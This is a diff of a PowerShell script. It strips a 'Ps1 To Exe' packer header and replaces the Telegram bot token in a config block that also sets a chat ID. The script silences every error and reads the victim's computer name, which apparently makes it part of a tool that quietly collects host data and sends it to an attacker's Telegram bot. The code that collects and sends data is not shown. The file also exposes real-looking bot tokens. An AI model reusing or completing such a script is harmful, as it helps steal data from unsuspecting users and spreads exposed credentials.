@@ -1,36 +1,3 @@
-﻿##[Ps1 To Exe]
-##
-##Kd3HDZOFADWE8uO1
-##Nc3NCtDXTlGDjr7a5DtL7EjhTChjP4zVsLWopA==
-##Kd3HFJGZHWLWoLaVvnQnhQ==
-##LM/RF4eFHHGZ7/K1
-##K8rLFtDXTiW5
-##OsHQCZGeTiiZ49I=
-##OcrLFtDXTie5
-##LM/BD5WYTiiZ4tI=
-##McvWDJ+OTiiZ4tI=
-##OMvOC56PFnzN8u+Vs1Q=
-##M9jHFoeYB2Hc8u+Vs1Q=
-##PdrWFpmIG2HcofKIo2QX
-##OMfRFJyLFzWE8uK1
-##KsfMAp/KUzWJ0g==
-##OsfOAYaPHGbQvbyVvnQX
-##LNzNAIWJGmPcoKHc7Do3uAuO
-##LNzNAIWJGnvYv7eVvnQX
-##M9zLA5mED3nfu77Q7TV64AuzAgg=
-##NcDWAYKED3nfu77Q7TV64AuzAgg=
-##OMvRB4KDHmHQvbyVvnQX
-##P8HPFJGEFzWE8tI=
-##KNzDAJWHD2fS8u+Vgw==
-##P8HSHYKDCX3N8u+Vgw==
-##LNzLEpGeC3fMu77Ro2k3hQ==
-##L97HB5mLAnfMu77Ro2k3hQ==
-##P8HPCZWEGmaZ7/K1
-##L8/UAdDXTlaDjofG5iZk2VjhV3oqePm/vKWs0I6sw+3jv2vcUZ90
-##Kc/BRM3KXhU=
-##
-##
-##fd6a9f26a06ea3bc99616d4851b372ba
 $ErrorActionPreference= 'silentlycontinue'
 $pcname = $env:COMPUTERNAME
 $RandomNumber = Get-Random
@@ -42,7 +9,7 @@ $RandomNumber = Get-Random
 ### TELEGRAM CONFIG
 
 $chatid = "1074750898" # YOUR TELEGRAM CHAT ID
-$bottoken = "7277880244:AAHVrByxIDqp7UUL9YzyF-ptREj9wHZ1Rjw" # YOUR TELEGRAM BOT TOKEN
+$bottoken = "6746792763:AAE8STn2Y5aDtKOrsrMZs-O4ePN0gc64kX4" # YOUR TELEGRAM BOT TOKEN
 
 ### TELEGRAM CONFIG
 
